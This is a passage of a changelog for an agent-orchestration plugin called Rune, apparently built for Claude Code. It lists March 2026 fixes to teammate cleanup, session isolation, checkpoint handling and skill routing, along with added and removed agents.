- **refactor(echo-search): extract helpers from 3 oversized functions** — Improved maintainability of echo-search MCP server by extracting helper functions from oversized implementations (#306)

### Added
- **feat(brainstorm): add critical thinking & truth-telling enhancements** — Enhanced brainstorm workflow with critical thinking and truth-telling capabilities for more rigorous idea exploration (#305)

## [1.163.5] - 2026-03-15

### Fixed
- **Remove `disable-model-invocation: true` from 10 user-invocable skills** — This flag blocked the Skill tool entirely, making `/rune:arc-batch`, `/rune:brainstorm`, `/rune:elevate`, `/rune:skill-testing`, `/rune:arc-hierarchy`, `/rune:arc-issues`, `/rune:runs`, `/rune:team-status`, `/rune:learn`, and `/rune:status` un-invocable even by the user. The Skill tool enforces `disable-model-invocation` as a hard block on all programmatic invocations, including user-triggered slash commands routed through it.

## [1.163.4] - 2026-03-15

### Fixed
- **Cancel commands use preprocessor checks to prevent hallucinated existence results** — `cancel-arc-batch`, `cancel-arc-issues`, and `cancel-arc-hierarchy` commands now use `` !`test -f ...` `` preprocessor substitution to deterministically check state file existence before the model sees the instructions. Previously, the model could skip the `Bash()` check step and falsely report "No active loop found" when a state file actually existed. The preprocessor runs at skill-load time, making the check impossible to skip.

## [1.163.3] - 2026-03-15

### Fixed
- **Arc zombie cleanup: clean ALL prior phase teams, not just the most recent** — `arc-phase-stop-hook.sh` zombie cleanup previously `break`ed after finding the first completed phase with a team_name. This left earlier phases' teams alive (e.g., `arc-plan-review` from Phase 2 surviving into Phase 7+ because only Phase 6's `rune-review` team was cleaned). Now iterates ALL completed phases.
- **Arc zombie cleanup: session-scoped scan for delegated sub-command teams** — Added FALLBACK 2 in `arc-phase-stop-hook.sh` that scans `rune-{review,work,mend,forge,inspect,...}-*` teams by `.session` marker ownership. Delegated sub-commands (e.g., `/rune:appraise` creating `rune-review-691dde5`) use identifiers NOT derived from the arc ID, so FALLBACK 1's arc-ID-based glob missed them entirely.

## [1.163.2] - 2026-03-15

### Fixed
- **Arc pre-flight missing `rune-plan-` team prefix** — Added `"rune-plan-"` to `ARC_TEAM_PREFIXES` in `arc-preflight.md` so orphaned devise teams from interrupted `/rune:devise` sessions are cleaned up before the arc pipeline starts. Previously, devise teammates (decree-arbiter, scroll-reviewer, etc.) would survive arc startup because none of arc's 3 cleanup layers knew about the `rune-plan-` prefix.

## [1.163.1] - 2026-03-15

### Fixed
- **Talisman context loading in arc pre-flight** — Added shard verification step to `arc-preflight.md` that validates `_meta.json` existence, re-resolves stale/missing shards inline, and logs key arc config values (`auto_merge`, `auto_pr`, `no_forge`) for LLM self-verification. Replaced abstract `readTalismanSection("arc")` in `arc-checkpoint-init.md` with explicit `Read("tmp/.talisman-resolved/arc.json")` + fallback chain, eliminating the pseudo-function indirection that allowed the LLM to check `.yml` instead of `.json`.

## [1.163.0] - 2026-03-15

### Added
- **Drift signal detection in strive workers** — Workers now detect plan-reality mismatches (missing APIs, wrong patterns, wrong paths) at Step 4.2 and write drift signal JSON files with session isolation fields. New inline arc phase `drift_review` reads signals after WORK, presents blockers to user, logs workarounds. Zero overhead when no signals exist.
- **Severity-gated mend filtering** — Round-aware severity filtering in parse-tome.md. Round 0 processes all findings (P1+P2+P3). Round 1+ filters to P1 + failed P2 only. P3 findings deferred to tech debt log (`tmp/arc/{id}/tech-debt-p3.md`). Convergence threshold configurable via existing talisman key `review.arc_convergence_p2_threshold`.
- **Domain decision echoes** — Post-arc echo persist now extracts domain decisions from worker logs (`### Decisions` sections) and writes top 5 unique decisions to planner echoes for cross-session learning via `/rune:devise` echo-reader.
- **New arc phase reference**: `arc-phase-drift-review.md` — inline phase algorithm for drift signal processing.

### Changed
- **Triage threshold enforced** — `phase-1-4-plan-and-monitor.md` triage threshold changed from advisory text to enforced logic (P1: FIX, P2: SHOULD FIX, P3: MAY SKIP).
- **Skip map documentation** — Added `drift_review` to runtime-dependent phase list in `arc-phase-constants.md`.
- **readPreviousRoundResults() documented** — Added contract documentation (source path, return type) in `parse-tome.md`.

## [1.162.1] - 2026-03-15

### Fixed
- **Devise cleanup ordering bug** — State file `tmp/.rune-plan-{ts}.json` was marked `"completed"` (step 2.5) BEFORE TeamDelete (step 3). When TeamDelete failed, downstream safety nets (CDX-7 `detect-workflow-complete.sh`, STOP-001 `on-session-stop.sh`) saw the completed marker and skipped team cleanup — orphaning teammates (decree-arbiter, depth-seer, evidence-verifier, knowledge-keeper, state-weaver, veil-piercer-plan, ward-sentinel). Moved state file marking to after TeamDelete + filesystem fallback, matching the correct ordering already used by forge, strive, and codex-review workflows.

## [1.162.0] - 2026-03-15

### Added
- **Pre-computed phase skip map** — New `skip_map` field in checkpoint (schema v23) pre-computes deterministic phase skip decisions at checkpoint init time. Up to 13 phases can be auto-skipped by the stop hook in ~25ms (O(1) jq call) instead of burning ~30s per phase on LLM dispatch. Saves 4-6 minutes per arc run for typical projects. Defense-in-depth: per-phase reference files retain skip logic as fallback.
- **`computeSkipMap()` function** — 7-parameter function in `arc-checkpoint-init.md` that evaluates talisman config, plan frontmatter, CLI flags, and Codex availability to produce a `{ phase_name: skip_reason }` map.
- **Single-pass auto-skip in stop hook** — `arc-phase-stop-hook.sh` processes all skip_map entries in one jq call with atomic checkpoint write, before the existing phase-finding loop. Graceful degradation on jq failure.
- **Canonical `SKIP_REASONS` enum** — Documented in `arc-phase-constants.md` with all valid skip reason strings and phase classification tables (pre-computable vs runtime-dependent).
- **Schema v22→v23 migration** — Step 3x in `arc-resume.md` adds empty `skip_map` for resumed checkpoints (safe default — no pre-skipping for resumed arcs).

### Changed
- **Forge pre-skip unified via skip_map** — `forge` phase now always starts as `"pending"` at init (was inline ternary `arcConfig.no_forge ? "skipped" : "pending"`). Skip decision moved to `skip_map.forge = "forge_disabled"` for consistent skip logging and auditing.
- **PHASE_ORDER count corrected** — 30 phases (was incorrectly documented as 29 — `deploy_verify` was missing from counts).

## [1.161.1] - 2026-03-15

### Fixed
- **TEAM-002: Agent Teams task contract enforcement** — Arc Phase 7.7 (test) and Phase 2 (plan review Layer 1) spawned teammates without TaskCreate, causing waitForCompletion to stall indefinitely. Added TaskCreate before every Agent() spawn, fixed waitForCompletion signatures to `(teamName, expectedCount, opts)`, added signal directory setup for fast-path monitoring.
- **11 agents missing task tools** — 4 testing agents (unit-test-runner, integration-test-runner, e2e-browser-tester, test-failure-analyst) and 7 utility agents (scroll-reviewer, decree-arbiter, knowledge-keeper, veil-piercer-plan, horizon-sage, evidence-verifier, state-weaver) lacked TaskList/TaskGet/TaskUpdate — unable to mark task completion as teammates.
- **Custom Ash phantom feature** — `talisman.yml` `ashes.custom[]` was designed (schema + Phase 1 discovery) but never wired into shared Phase 3 spawn path. `buildAshPrompt()` now has 3-tier dispatch: custom Ash (wrapper template + agent instructions) → specialist → built-in. `inscription.custom_agent_ashes` is now read by both standard and deep depth paths.
- **ash-summoning.md contradicted orchestration-phases.md** — Custom Ash spawn used `subagent_type: entry.agent` in ash-summoning.md but shared path uses `subagent_type: "general-purpose"`. Aligned to shared pattern.

### Added
- **Iron Law TEAM-002** — New Core Rule 13 in CLAUDE.md: 3-component contract (TaskCreate before Agent, TaskUpdate in agent tools, task completion instruction in prompt).
- **validate-task-contract.sh** — Pre-commit script detecting TEAM-002-A (missing TaskCreate), TEAM-002-B (wrong waitForCompletion signature), TEAM-002-C (missing TaskUpdate). Supports `TEAM-002-IGNORE:` annotation.
- **Task Lifecycle docs** — Added to 4 testing agents explaining how to claim and complete tasks via TaskList + TaskUpdate.

## [1.161.0] - 2026-03-15

### Added
- **sediment-detector review agent** — Cross-reference analysis agent for plugin infrastructure health. Detects 7 sediment categories (SDMT-001 through SDMT-007): phantom agents, dead config, dead commands, orphan scripts, unrouted skills, count drift, artifact dirs. Inline git analysis for triage scoring (utility × 0.4 + uniqueness × 0.3 + integration_ease × 0.3). Gated behind `.claude-plugin/plugin.json` existence check.
- **validate-plugin-wiring.sh** — Fast deterministic pre-commit script (<2s, no LLM) for 4 sediment checks: unwired agents, unrouted skills, missing SKILL.md, orphan scripts. Supports `# SDMT-IGNORE: reason` annotations.
- **arc Phase 7.9 deployment verification** — Conditional deployment-verifier spawn when diff contains migrations, API route changes, or config/env changes. New reference file `arc-phase-deploy-verify.md`.
- **12 skills added to router tables** — design-sync, elevate, file-todos, learn, resolve-all-gh-pr-comments, resolve-gh-pr-comment, resolve-todos, skill-testing, team-status, test-browser, ux-design-process, team-delegate (experimental).
- **CLAUDE.md pre-commit checklist** — Added SDMT validation items (wiring script, agent spawn sites, skill routing, config consumers).

### Changed
- **schema-drift-detector wired into Forge Warden** — Added as conditional Perspective (activates only when diff contains schema/migration files). Prefix: BACK-.
- **phantom-warden wired into Forge Warden** — Added as audit-only Perspective for documented-but-unimplemented features. Prefix: PHNT-.
- **sediment-detector wired into audit pipeline** — Auto-selected by Rune Gaze when `scope === "full"` and `.claude-plugin/plugin.json` exists. Added as Pattern Weaver Perspective with SDMT- prefix.
- **team-delegate command marked experimental** — Description updated with experimental tag.
- **deployment_verification talisman config removed** — Section was never consumed. Will be re-added with consumer documentation after deployment-verifier wiring.

### Removed
- **4 condenser agents** — `condenser-gap`, `condenser-plan`, `condenser-verdict`, `condenser-work`. Superseded by `artifact-extract.sh` (zero failures across 92 arc runs).
- **2 dead commands** — `team-shutdown`, `team-spawn`. Superseded by team-sdk `shutdown()` protocol and `TeamCreate` SDK.
- **2 diagnostic scripts** — `measure-startup-tokens.sh`, `measure-startup-tokens.py`. One-time diagnostic; results captured in `references/tokens-snapshot.json`.

## [1.160.1] - 2026-03-14

### Changed
- **Adaptive cleanup grace period** — `shutdown()` in engines.md now scales grace period based on SendMessage delivery results (2s when all dead, 5-20s when some alive). Saves 10-18s in the common case.
- **Tighter retry backoff** — `CLEANUP_DELAYS` reduced from `[0, 5000, 10000, 15000]` (30s) to `[0, 3000, 6000, 10000]` (19s). Total cleanup budget reduced from 50s to 21-39s max.
- **CLAUDE.md cleanup pattern aligned** — Added canonical source cross-reference, adaptive grace, updated delays, Step 6 diagnostic reference.

### Added
- **Cleanup diagnostic signal** — engines.md `shutdown()` step 6 emits `warn()` trace + `tmp/.rune-cleanup-{team}.json` with confirmed_alive/dead counts, grace period, retry attempts, and fallback usage.
- **Time-gated teammate force-stop** — `on-teammate-idle.sh` force-stops teammates idle >5 minutes cumulative (configurable via `RUNE_MAX_IDLE_DURATION` env var, default 300s). Complements existing count-based `MAX_IDLE_RETRIES=3`.

### Fixed
- **FLAW-001: mkdir guard for time-gate** — Added `mkdir -p` before first-idle file write to prevent silent time-gate disable when signal directory doesn't exist yet.
- **FLAW-002: epoch validation** — Validates first_idle_epoch within 24h range; resets stale/corrupt values instead of triggering false-positive force-stop (epoch=0 produced ~1.7B seconds elapsed).

## [1.160.0] - 2026-03-14

### Added
- **Unified `.rune/` system directory** — Talisman defaults-only resolution now caches to `${CHOME}/.rune/talisman-resolved/` instead of polluting project `tmp/`. New users see zero files created in project directories. SHA-256 hash guard enables <50ms fast-path on subsequent sessions.
- **`_rune_resolve_talisman_shard()` helper** — New `lib/talisman-shard-path.sh` provides project→system fallback shard resolution for hook scripts. Path traversal guard included.
- **`/rune:rest --system` flag** — Cleans system-level talisman cache (shared cross-project). Default `/rune:rest` preserves system shards.

### Changed
- **Venv migrated to `.rune/venv/`** — `rune-venv.sh` now creates venvs at `${CHOME}/.rune/venv/` instead of `${CHOME}/rune-venv/`. Old path auto-cleaned on first run. `umask 077` on `.rune/` creation (SEC-002).
- **`readTalismanSection()` gains 4-tier fallback** — project shard → system shard → full talisman → empty object. Updated in `references/read-talisman.md`.
- **`_meta.json` schema v2** — Adds `cache_type` field ("system" or "project"), `defaults_hash` for system cache. System-level meta omits `owner_pid`/`session_id`.

### Fixed
- **FLAW-001: Hook scripts reading wrong shards** — 4 hook scripts read `misc.json` but their settings live in dedicated shards (`context_stop_guard`, `tool_failure_tracking`, `keyword_detection`, `deliverable_verification`). User talisman overrides for these features were silently ignored. Now routed to correct shards.
- **TOCTOU symlink guard** (SEC-001) — Post-mkdir symlink recheck added to `talisman-resolve.sh` and `rune-venv.sh`.

## [1.159.3] - 2026-03-14

### Fixed
- **Teammate cleanup race condition: grace period too short for single-member teams** — 8 arc phase cleanup locations used 5s grace period (optimization) which is insufficient for async deregistration under load (can take 10-15s). Increased to 12s. Affected: `arc-phase-pre-ship-validator.md`, `arc-phase-task-decomposition.md`, `gap-analysis.md`, `arc-codex-phases.md` (2 handlers), `arc-phase-test.md`, `arc-phase-mend.md`, `mend/fixer-spawning.md`.
- **Missing try-catch on SendMessage in cleanup loops** — 12 cleanup files sent `shutdown_request` without try-catch. If a teammate had already exited, the exception could skip remaining teammates, leaving them orphaned. Added `try { SendMessage(...) } catch (e) {}` to: forge, devise, strive, mend, debug, codex-review, appraise, resolve-todos, design-sync, inspect, design-prototype, and shared roundtable-circle orchestration.
- **SIGTERM-to-SIGKILL gap too short (3s → 5s)** — 17 cleanup locations across all skills used `sleep 3` between SIGTERM and SIGKILL. Under heavy load (blocked I/O, memory pressure), 3s is insufficient for graceful shutdown, resulting in zombie processes. Increased to 5s everywhere including the standard cleanup pattern in `.claude/CLAUDE.md` and `team-sdk/engines.md`.

## [1.159.2] - 2026-03-14

### Fixed
- **Missing `JSON.parse()` in 9 team cleanup files** — `Read()` returns a string, not a parsed object. Accessing `.members` on a string yields `undefined`, causing dynamic member discovery to silently fail and send zero `shutdown_request` messages. Affected: mend (`phase-7-cleanup.md`), codex-review (`phase4-cleanup.md`), cancel-review, cancel-audit, cancel-codex-review, cancel-arc, arc `postPhaseCleanup` (`arc-phase-cleanup.md`), arc post-arc sweep (`post-arc.md`), arc plan-review (`arc-phase-plan-review.md`). All 9 now wrapped in `JSON.parse()`.
- **Empty fallback arrays in 3 cancel commands** — `cancel-review.md`, `cancel-audit.md`, `cancel-codex-review.md` had empty `allMembers = []` in catch blocks. Added hardcoded fallback agent lists covering all possible teammates per workflow.
- **Cleanup fallback array gaps in 4 workflows** — appraise: added 4 UX reviewers, `design-implementation-reviewer`, 5 shard reviewers. roundtable-circle: added 5 shard reviewers. devise: added 27 Forge Gaze agents + 6 elicitation sages. inspect: added `inspect-lore-analyst`.
- **Missing process-level kill (step 5a) in 2 cleanup files** — `inspect/verdict-synthesis.md` and `arc-phase-plan-review.md` filesystem fallback blocks went directly to `rm -rf` without SIGTERM/SIGKILL sequence. Added standard pgrep/kill pattern.
- **Deprecated `Task` tool references** — `ash-guide/SKILL.md` lines 32-34, 41, 44: `Task rune:` → `Agent rune:`. `rune-orchestration/references/verifier-prompt.md` lines 3, 16: prose and YAML key updated to `Agent`.
- **Stale agent counts in `tarnished/references/rune-knowledge.md`** — Updated: 89→98 total agents, 40→35 review, 12→23 utility, 4→6 work, 4→5 testing. Updated echo tiers from 3 to 5 (added Notes and Observations).
- **README.md version badge** — Updated to match current plugin version.

## [1.159.1] - 2026-03-14

### Fixed
- **Arc Sibling Resume Session Safety** — Propagated Decision Matrix 2 (R1-R5) resume validation to `arc-batch`, `arc-issues`, and `arc-hierarchy`. Resume now validates `config_dir` (cross-installation block) and `owner_pid` liveness (cross-session hijack prevention) before proceeding. Added `compact_pending` race mitigation on resume, progress file JSON.parse try/catch with corruption handling, progress file structure validation, and feature branch guard for `arc-hierarchy` resume. SEC-1 numeric PID guard on all `kill -0` interpolations.

## [1.159.0] - 2026-03-14

### Added
- **Phantom Warden review agent** (`agents/review/phantom-warden.md`) — Detects phantom implementations: documented-but-not-implemented features, code that exists but isn't integrated, dead specifications, designed-but-never-executed features, missing execution engines, unenforced rules, and fallback-as-default patterns. 8 detection modes covering spec-to-code and doc-to-implementation gaps. Finding prefix: `PHNT`. Complements strand-tracer (wiring), void-analyzer (stubs), wraith-finder (dead code), and phantom-checker (dynamic refs) with traceability focus.
- **Phantom Warden talisman registration** (`.claude/talisman.yml`) — Custom Ash entry with `PHNT` finding prefix, `context_budget: 30` (elevated for cross-reference scope), and dedup hierarchy placement between DPMT and DOC.

## [1.158.0] - 2026-03-14

### Added
- **Phase 5.0.5: Agent Finding Noise Filter** (`roundtable-circle/references/pre-aggregate.md`) — Suppresses low-signal P3 findings before TOME condensation. Three rules: (1) confidence_floor gate (P3 below 35 score suppressed), (2) proximity dedup (P3 within 10 lines of same-file P1/P2 suppressed), (3) ratio cap (P3 excess above 40% of total suppressed by lowest confidence first). PROVEN findings exempt from all rules. Minimum-surviving floor ensures at least 1 finding always surfaces. Suppressed findings preserved in collapsible `<details>` section — not discarded. Talisman-gated: `review.noise_filter.enabled` (default: true).
- **Incremental Strive Resume** (`strive/SKILL.md`, `strive/references/forge-team.md`) — `/rune:strive --resume` skips completed tasks after session crash. Checkpoint written after each task completion using atomic tmp+mv pattern. Checkpoint schema includes `plan_mtime` for drift detection, `owner_pid` for cross-session isolation, and `task_artifacts` for file existence verification on resume. Session isolation enforced via config_dir + kill -0 liveness check. Stale checkpoint threshold configurable via `work.checkpoint_max_age_ms` (default: 24h).
- **File Ownership Pre-Check** (`strive/references/file-ownership.md`) — Phase 1.7a conflict detection runs BEFORE user confirmation dialog, catching file collisions at planning time instead of after worker spawn. Conflicting tasks auto-serialized via `blockedBy`. Excluded via `unrestricted_shared_files` talisman config. Chain detection warns when serialization creates dependency chains ≥ 3 tasks.
- **Phase Timing Telemetry** (`scripts/arc-phase-stop-hook.sh`) — Records wall-clock duration per phase to `phase-log.jsonl` as `phase_timing` events (consistent with existing JSONL format). End-of-arc summary table emitted showing phase durations and % of total. Variables use `_timing_` prefix. Symlink guards on all I/O. Cleaned by `/rune:rest` as part of `tmp/arc/` directory.
- **Smart Compaction Trigger — Tier 2** (`scripts/arc-phase-stop-hook.sh`) — Replaces static 50% threshold with predictive weight-based estimation. `_phase_weight()` case statement (bash 3.2 macOS compatible — no `declare -A`) assigns context weights per phase (work=5, code_review=4, forge/mend/test=3, etc.). Compaction triggered when `usable_budget < estimated_need` (70% safety margin) or `remaining_pct < 35` (hard floor). Bridge unavailable → falls through to existing Tier 3 interval fallback. Tiers 0, 1, 3 unchanged.

## [1.157.0] - 2026-03-14

### Added
- **KEYWORD-001: UserPromptSubmit keyword detection hook** (`scripts/keyword-detector.sh`) — Intercepts user prompts and suggests matching Rune workflows based on 9 keyword patterns (review, plan, audit, brainstorm, implement, debug, impact, arc, cancel). Advisory only — never blocks. Talisman-gated via `keyword_detection.enabled`. Includes Vietnamese keyword support.
- **FAIL-001: PostToolUseFailure escalating retry guidance** (`scripts/track-tool-failure.sh`) — Tracks per-session, per-tool failure counts. Silent for failures 1-2, advisory at 3-4, strong "stop retrying" guidance at 5+. Talisman-gated with configurable thresholds. Companion: `reset-tool-failure.sh` clears counters on success.
- **FAIL-001 success reset** (`scripts/reset-tool-failure.sh`) — Clears failure counter when a tool succeeds, preventing stale counts from triggering escalation on future unrelated failures.
- **DELIV-001: SubagentStop deliverable verification** (`scripts/verify-agent-deliverables.sh`) — Advisory check that agents produced expected output files on stop. Checks review agents (findings in tmp/), research agents (output in tmp/plans/*/research/), and work agents (git diff non-empty). Non-blocking.
- **CTX-STOP-001: Stop hook context percentage guard** (`scripts/context-percent-stop-guard.sh`) — Warns at 70% and 85% context usage thresholds via existing statusline bridge file. Advisory — never blocks. Max 2 warnings per session. Never fires on context_limit or user-abort stops.
- **Rate limit auto-resume** in arc Stop hooks (`scripts/stop-hook-common.sh`) — Detects rate limit errors in transcript and injects wait guidance with auto-resume after backoff.
- 4 new talisman config sections: `keyword_detection`, `tool_failure_tracking`, `deliverable_verification`, `context_stop_guard` — all with enabled/threshold knobs for feature gating.

## [1.156.1] - 2026-03-14

### Fixed
- **Arc Multi-Session Safety** — strict ownership validation (`validate_session_ownership_strict()`), pre-flight conflict detection (Decision Matrix 1: F1-F6), branch validation with 4-case decision matrix, cross-session team cleanup hardening. 13 additional round-1 review findings resolved (session safety, cross-platform compatibility, arithmetic clamping, trace path caching)
- **Command count stale in plugin.json/marketplace.json** — corrected from 19 to actual 17 commands

## [1.156.0] - 2026-03-13

### Added
- **Arc operational resilience** — stuck detection (GUARD 9: per-phase dispatch count, 4-dispatch cap), Boundary Map section in plan templates for explicit produces/consumes contracts, Must-Haves Task Verification Protocol (Truths/Artifacts/Key Links), Reassessment Gate in gap-analysis (STEP D.6, >40% MISSING triggers warning)

### Changed
- **Rune Workflow Quality Improvements** — arc phase stop hook hardened with ownership claim (write session_id + owner_pid on first touch, update stale PID on resume), pre-aggregation Layer 1.5 expanded, strive file-ownership enforcement strengthened, forge-team reference added
- **Session team hygiene**: Removed Layer 2 arc resumability advisory that caused automatic arc resume without user consent — users must explicitly run `/rune:arc --resume`

## [1.155.0] - 2026-03-13

### Removed
- **Utility Crew agent-based composition system** — context-scribe, prompt-warden, dispatch-herald agents and utility-crew skill removed. System was designed but never executed (zero artifacts produced across all workflows). Shell-based extraction utilities (artifact-extract.sh, condenser agents) are preserved and unaffected.
  - Deleted: 3 agent definitions, 1 skill (4 files)
  - Cleaned: Phase references in devise (0.8), strive (1.5), appraise, audit, arc
  - Cleaned: Cleanup fallback arrays, talisman config, agent registries, cost-tier mapping
  - Updated: plugin.json, marketplace.json, README badges (97 agents, 54 skills)

### Changed
- **Rename `utility_crew` → `artifact_extraction`** — shell-based extraction config key renamed to remove confusion with deleted agent-based system
  - Script: `utility-crew-extract.sh` → `artifact-extract.sh`
  - Talisman config: `utility_crew` → `artifact_extraction`
  - Variable: `utilityCrewEnabled` → `extractionEnabled` in 4 arc phase files

## [1.154.4] - 2026-03-13

### Fixed
- **Arc completion stamp missing 12 phases**: Phase results table in `arc-phase-completion-stamp.md` only tracked 17/29 phases. Added missing: `design_extraction`, `design_prototype`, `task_decomposition`, `storybook_verification`, `design_verification`, `ux_verification`, `design_iteration`, `test_coverage_critique`, `pre_ship_validation`, `release_quality_check`, `bot_review_wait`, `pr_comment_resolution`. Completion records now show all 29 phases matching PHASE_ORDER.
- **Freshness gate result never persisted to checkpoint** (FLAW-003): `freshness-gate.md` computed `freshnessResult` but never called `updateCheckpoint({ freshness: freshnessResult })`. This caused Layer 2 freshness re-check in `verification-gate.md` (section 8) to always silently fail because `checkpoint?.freshness` was always undefined.
- **Design iteration phase_sequence collision**: `arc-phase-design-iteration.md` used `phase_sequence: 5.3` which collided with `ux_verification` (also 5.3). Corrected to `phase_sequence: 7.6` matching the phase display number.

## [1.154.3] - 2026-03-13

### Fixed
- **Utility Crew pipeline wiring**: Wire Utility Crew (context-scribe, prompt-warden) into workflow execution paths. Previously, these agents were fully designed but never invoked in pipeline overviews.
  - `devise/SKILL.md`: Added Phase 0.8 (Utility Crew) between Phase 0 and Phase 1
  - `audit/SKILL.md`: Added Phase 2.5-2.8 (Utility Crew) between Phase 2 and Phase 3
  - `appraise/SKILL.md`: Added Utility Crew reference after orchestration parameters
  - `strive/SKILL.md`: Renumbered Design Context Discovery from 1.5 to 1.4, added top-level Phase 1.5 (Utility Crew)
- Regenerated `talisman-defaults.json` to reflect current schema

## [1.154.2] - 2026-03-13

### Fixed
- **Session isolation hardening**: Fixed fallback code paths in stop hooks (`arc-batch-stop-hook.sh`, `arc-hierarchy-stop-hook.sh`, `arc-issues-stop-hook.sh`) that checked PID instead of the full 3-layer session identity model (config_dir + session_id + owner_pid with EPERM)
- **Race condition fixes**: `detect-workflow-complete.sh` and `enforce-polling.sh` — guarded against TOCTOU races in workflow state detection
- **Shell compatibility**: `lib/platform.sh` `_parse_iso_epoch()` — fixed BSD/GNU date fallback chain edge cases
- **Lock reclaim safety**: `lib/workflow-lock.sh` — hardened lock reclaim with session isolation checks
- **Cleanup robustness**: `on-session-stop.sh` — removed `local` from main-body scope (crash fix), improved cleanup ordering and error handling
- Files fixed: `arc-batch-stop-hook.sh`, `arc-hierarchy-stop-hook.sh`, `arc-issues-stop-hook.sh`, `detect-workflow-complete.sh`, `enforce-polling.sh`, `lib/platform.sh`, `lib/workflow-lock.sh`, `on-session-stop.sh`

## [1.154.1] - 2026-03-12

### Fixed
- **CRITICAL: Cross-session arc hijacking** — Stop hook from a different Claude Code session (same directory) could claim ownership of another session's arc pipeline via claim-on-first-touch when `session_id` was "unknown"
- **Root cause**: Arc SKILL.md used Bash-only pattern `Bash('echo "${CLAUDE_SESSION_ID:-...}"')` for session_id, but `CLAUDE_SESSION_ID` is not available in Bash tool context (anthropics/claude-code#25642), resulting in `session_id: unknown` in state files
- **Fix (Prong 1)**: Changed arc SKILL.md + 6 reference files to use `"${CLAUDE_SESSION_ID}" || Bash(...)` pattern (SKILL.md preprocessor substitution first, Bash fallback). Aligns with the pattern already used by 15+ other skills (arc-batch, arc-issues, forge, appraise, etc.)
- **Fix (Prong 2)**: Hardened claim-on-first-touch in `stop-hook-common.sh` with process tree verification — walks up to 4 ancestor levels via `ps -o ppid=` to verify the hook is a descendant of the `owner_pid` that created the state file. Different session's hook fails the ancestry check and is rejected
- Files fixed: `arc/SKILL.md`, `arc/references/arc-resume.md`, `arc/references/arc-phase-cleanup.md`, `strive/references/monitor-inline.md`, `team-sdk/references/engines.md`, `team-sdk/references/protocols.md`, `goldmask/references/orchestration-protocol.md`, `scripts/lib/stop-hook-common.sh`

## [1.154.0] - 2026-03-12

### Removed
- **CronCreate/CronDelete/CronList**: Removed non-functional Layer 1 arc scheduler. These tools were never successfully invoked during arc runs — `typeof CronCreate !== 'undefined'` pseudocode check doesn't translate to Claude tool availability detection.
- **arc.scheduler talisman config**: Removed `scheduler:` section from talisman-example.yml (no longer needed)
- **Checkpoint scheduler fields**: Removed `cron_task_id` and `scheduler` from checkpoint schema
- **Scheduled task blocks**: Removed scheduled task creation (arc-checkpoint-init), cleanup (post-arc), cancellation (cancel-arc, cancel-arc-batch, cancel-arc-hierarchy, cancel-arc-issues)
- **arc-monitoring-task.md Layer 1**: Rewritten to document SessionStart crash recovery only

### Changed
- **arc-heartbeat-writer.sh**: Updated comments — heartbeat now serves Layer 2 (SessionStart) only
- **hooks.json**: Updated ARC-HEARTBEAT-001 rationale — Layer 2 only
- **README.md**: Replaced Arc Scheduler section with brief SessionStart recovery guidance
- **docs/glm-5-setup.md**: Removed `CLAUDE_CODE_DISABLE_CRON` env var from setup examples

## [1.153.2] - 2026-03-12

### Fixed
- **SEC-002**: Strip markdown headers from task observation data to prevent header injection in echo entries
- **SEC-003**: Allowlist GLOBAL_DB_PATH parent directory — must be under user home or system temp
- **SEC-004**: Use `--` separator in doc-pack roles to match VALID_ROLE_RE / _SAFE_ROLE_RE
- **BACK-201**: Return descriptive error when `scope=global` but global DB is unavailable
- **BACK-303**: Validate global and project echo dirs don't overlap to prevent scope contamination during reindex
- **BACK-402**: Check GLOBAL_DB_PATH availability before consuming dirty signal (previously lost signal when path unset)
- **BACK-403**: Use scope-prefixed keys (`project:<id>` / `global:<id>`) for cross-DB dedup to prevent ID collisions
- **QUAL-001**: Add `scope` parameter to `echo_details` for cross-DB lookup with fallback
- **QUAL-003**: Add `scope` parameter to `echo_record_access` for global DB routing
- **QUAL-100**: Parse Category/Domain outside metadata guard for robust doc pack parsing
- Narrowed `get_global_conn` exception handling from bare `Exception` to `(sqlite3.OperationalError, sqlite3.DatabaseError, OSError)`
- Improved f-string safety comment for PRAGMA user_version
- Added `domain` column to echo_entries INSERT statement

### Changed
- Moved `todos/` from `.gitattributes` to `.gitignore`

## [1.153.1] - 2026-03-12

### Added
- **Restored file-todos and resolve-todos as standalone skills**: Both skills are available via `/rune:file-todos` and `/rune:resolve-todos` for manual invocation. No longer integrated into workflow pipelines (arc, strive, appraise, mend, audit).
- **Restored todo-verifier agent**: Required by `/rune:resolve-todos` verify-before-fix pipeline.
- **Restored SEC-RESOLVE-001 hook**: `validate-resolve-fixer-paths.sh` for resolve-todos file scope enforcement.

### Changed
- Updated integration-guide.md with standalone-only notice (workflow integrations are historical reference)
- Updated agent count: 99 → 100 (restored todo-verifier)
- Updated utility agent count: 25 → 26
- Updated skill count: 53 → 55 (restored file-todos, resolve-todos)

## [1.153.0] - 2026-03-12

### Removed
- **File-todos system**: Completely removed the broken file-todos subsystem that never achieved reliable operation (~0% success rate for review/audit todos, ~16% for work todos in arc). Removed 24 files total:
  - `skills/file-todos/` (entire skill — SKILL.md + 8 reference files)
  - `skills/resolve-todos/` (entire skill — SKILL.md + CREATION-LOG.md + 6 reference files)
  - `commands/file-todos.md` (command entry point)
  - `agents/utility/todo-verifier.md` (TODO staleness verification agent)
  - `scripts/validate-resolve-fixer-paths.sh` (SEC-RESOLVE-001 hook)
  - `scripts/validate-strive-todos.sh` (STRIVE-TODOS-001 hook)
  - `skills/roundtable-circle/references/todo-generation.md` and `todo-generation-phase.md` (Phase 5.4)
  - `skills/mend/references/todo-update-phase.md` (Phase 5.9)
- **Phase 5.4 todo generation** from roundtable-circle orchestration (review/audit never generated todos)
- **Phase 5.9 todo update** from mend pipeline
- **Talisman keys**: `file_todos.*`, `mend.todos_per_fixer`, `work.todos_per_worker`
- **Hook entries**: SEC-RESOLVE-001, STRIVE-TODOS-001 from hooks.json
- **`todos_base` checkpoint field** from arc checkpoint schema
- **`todo-verifier`** from known-rune-agents registry and cost-tier-mapping
- **`resolve-todos`** team pattern from rest.md cleanup scan
- **`.gitignore` entries**: `todos/` and `docs/todos/`

### Changed
- Renamed `work.todos_per_worker` references to `work.tasks_per_worker` in strive wave execution
- Updated agent count: 100 → 99 (removed todo-verifier)
- Updated utility agent count: 26 → 25
- Updated command count: 18 → 17 (removed /rune:file-todos)
- Updated skill count: 55 → 53 (removed file-todos, resolve-todos)

## [1.152.0] - 2026-03-12

### Added
- **Rune Lore — Global Echoes + Doc Packs**: Cross-project knowledge persistence via global echo store (#278)
- **Global scope for echo-search**: `scope` parameter (`project|global|all`) on `echo_search`, `echo_reindex`, `echo_stats` MCP tools
